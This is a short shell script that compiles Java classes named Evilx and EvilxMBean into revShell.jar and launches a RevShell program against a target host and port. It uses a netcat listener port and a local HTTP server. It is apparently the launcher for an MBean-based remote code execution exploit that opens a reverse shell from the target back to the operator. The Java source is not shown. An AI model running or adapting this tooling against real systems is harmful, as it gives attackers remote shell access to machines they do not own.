#!/bin/sh
echo Compiling Java source
javac *.java
echo Creating JAR
jar cf revShell.jar Evilx.class EvilxMBean.class

if [ "$3" == "" ]; then exit; fi

echo Starting reverse shell
# Target address
TARGET_HOSTNAME=$1
TARGET_PORT=$2
# Port number of the netcat listener (other than LOCAL_HTTP_PORT)
LISTENER_PORT=$3
# Port number where the web server will listen
LOCAL_HTTP_PORT=1337

java RevShell $TARGET_HOSTNAME $TARGET_PORT $LISTENER_PORT $LOCAL_HTTP_PORT
